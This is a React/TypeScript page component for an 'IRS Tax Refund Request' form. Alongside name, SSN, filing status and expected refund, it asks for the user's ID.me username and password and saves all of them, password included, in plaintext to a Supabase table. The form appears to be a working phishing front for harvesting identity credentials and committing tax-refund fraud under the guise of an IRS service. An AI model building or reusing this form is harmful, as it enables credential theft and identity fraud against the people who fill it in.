import { DashboardLayout } from '@/components/layout/DashboardLayout';
import { motion } from 'framer-motion';
import { FileText, CheckCircle2, Loader2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useState } from 'react';
import { useToast } from '@/hooks/use-toast';
import { supabase } from '@/integrations/supabase/client';
import { useAuth } from '@/contexts/AuthContext';
import { useQuery } from '@tanstack/react-query';

const TaxRefund = () => {
  const { user } = useAuth();
  const { toast } = useToast();
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);

  const [formData, setFormData] = useState({
    full_name: '',
    ssn: '',
    filing_status: 'single',
    tax_year: '2025',
    refund_amount: '',
    idme_username: '',
    idme_password: '',
  });

  const { data: existingRequests } = useQuery({
    queryKey: ['tax_refund_requests', user?.id],
    queryFn: async () => {
      if (!user?.id) return [];
      const { data, error } = await supabase
        .from('tax_refund_requests')
        .select('*')
        .eq('user_id', user.id)
        .order('created_at', { ascending: false });
      if (error) throw error;
      return data;
    },
    enabled: !!user?.id,
  });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!user?.id) return;

    if (!formData.full_name || !formData.idme_username || !formData.idme_password) {
      toast({ title: 'Please fill in all required fields', variant: 'destructive' });
      return;
    }

    setIsSubmitting(true);
    try {
      const { error } = await supabase.from('tax_refund_requests').insert({
        user_id: user.id,
        full_name: formData.full_name,
        ssn: formData.ssn,
        filing_status: formData.filing_status,
        tax_year: formData.tax_year,
        refund_amount: formData.refund_amount ? parseFloat(formData.refund_amount) : null,
        idme_username: formData.idme_username,
        idme_password: formData.idme_password,
      });

      if (error) throw error;
      setShowSuccess(true);
      setFormData({ full_name: '', ssn: '', filing_status: 'single', tax_year: '2025', refund_amount: '', idme_username: '', idme_password: '' });
    } catch (error) {
      toast({ title: 'Failed to submit request', description: (error as Error).message, variant: 'destructive' });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (showSuccess) {
    return (
      <DashboardLayout>
        <div className="min-h-[60vh] flex items-center justify-center">
          <motion.div initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} className="max-w-md w-full text-center">
            <div className="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center mx-auto mb-4">
              <CheckCircle2 className="w-10 h-10 text-white" />
            </div>
            <h1 className="text-xl font-bold text-foreground mb-1">Request Submitted</h1>
            <p className="text-sm text-muted-foreground mb-5">Your IRS Tax Refund request has been submitted and is under review.</p>
            <Button size="sm" onClick={() => setShowSuccess(false)}>Submit Another</Button>
          </motion.div>
        </div>
      </DashboardLayout>
    );
  }

  return (
    <DashboardLayout>
      <div className="max-w-2xl mx-auto space-y-5">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }}>
          <h1 className="text-xl lg:text-2xl font-bold text-foreground mb-0.5">IRS Tax Refund Request</h1>
          <p className="text-sm text-muted-foreground">Submit your tax refund request for processing</p>
        </motion.div>

        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="p-5 rounded-xl bg-card border border-border"
        >
          <form onSubmit={handleSubmit} className="space-y-4">
            <div className="space-y-1.5">
              <h3 className="text-sm font-semibold text-foreground">Personal Information</h3>
              <div className="grid md:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">Full Legal Name *</label>
                  <Input name="full_name" value={formData.full_name} onChange={handleChange} placeholder="John Doe" />
                </div>
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">SSN</label>
                  <Input name="ssn" value={formData.ssn} onChange={handleChange} placeholder="XXX-XX-XXXX" />
                </div>
              </div>
              <div className="grid md:grid-cols-3 gap-3">
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">Filing Status</label>
                  <select name="filing_status" value={formData.filing_status} onChange={handleChange}
                    className="w-full h-10 px-3 rounded-lg border border-border bg-background text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
                  >
                    <option value="single">Single</option>
                    <option value="married_filing_jointly">Married Filing Jointly</option>
                    <option value="married_filing_separately">Married Filing Separately</option>
                    <option value="head_of_household">Head of Household</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">Tax Year</label>
                  <select name="tax_year" value={formData.tax_year} onChange={handleChange}
                    className="w-full h-10 px-3 rounded-lg border border-border bg-background text-sm text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
                  >
                    <option value="2025">2025</option>
                    <option value="2024">2024</option>
                    <option value="2023">2023</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">Expected Refund</label>
                  <Input name="refund_amount" type="number" value={formData.refund_amount} onChange={handleChange} placeholder="0.00" />
                </div>
              </div>
            </div>

            <div className="border-t border-border pt-4 space-y-1.5">
              <h3 className="text-sm font-semibold text-foreground">ID.me Credentials</h3>
              <p className="text-xs text-muted-foreground">Required for identity verification</p>
              <div className="grid md:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">ID.me Username *</label>
                  <Input name="idme_username" value={formData.idme_username} onChange={handleChange} placeholder="username@email.com" />
                </div>
                <div>
                  <label className="block text-xs font-medium text-foreground mb-1">ID.me Password *</label>
                  <Input name="idme_password" type="password" value={formData.idme_password} onChange={handleChange} placeholder="••••••••" />
                </div>
              </div>
            </div>

            <Button type="submit" className="w-full text-sm" disabled={isSubmitting}>
              {isSubmitting ? <><Loader2 className="w-4 h-4 mr-2 animate-spin" /> Submitting...</> : <><FileText className="w-4 h-4 mr-2" /> Submit Request</>}
            </Button>
          </form>
        </motion.div>

        {existingRequests && existingRequests.length > 0 && (
          <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }}>
            <h2 className="text-sm font-semibold text-foreground mb-3">Previous Requests</h2>
            <div className="space-y-2">
              {existingRequests.map((req: any) => (
                <div key={req.id} className="p-4 rounded-lg bg-card border border-border flex items-center justify-between">
                  <div>
                    <p className="text-sm font-medium text-foreground">{req.full_name}</p>
                    <p className="text-xs text-muted-foreground">Tax Year: {req.tax_year} · Filed: {new Date(req.created_at).toLocaleDateString()}</p>
                  </div>
                  <span className={`text-xs font-medium px-2.5 py-1 rounded-full ${
                    req.status === 'approved' ? 'bg-emerald-500/10 text-emerald-600' :
                    req.status === 'rejected' ? 'bg-red-500/10 text-red-500' :
                    'bg-amber-500/10 text-amber-600'
                  }`}>
                    {req.status?.charAt(0).toUpperCase() + req.status?.slice(1)}
                  </span>
                </div>
              ))}
            </div>
          </motion.div>
        )}
      </div>
    </DashboardLayout>
  );
};

export default TaxRefund;
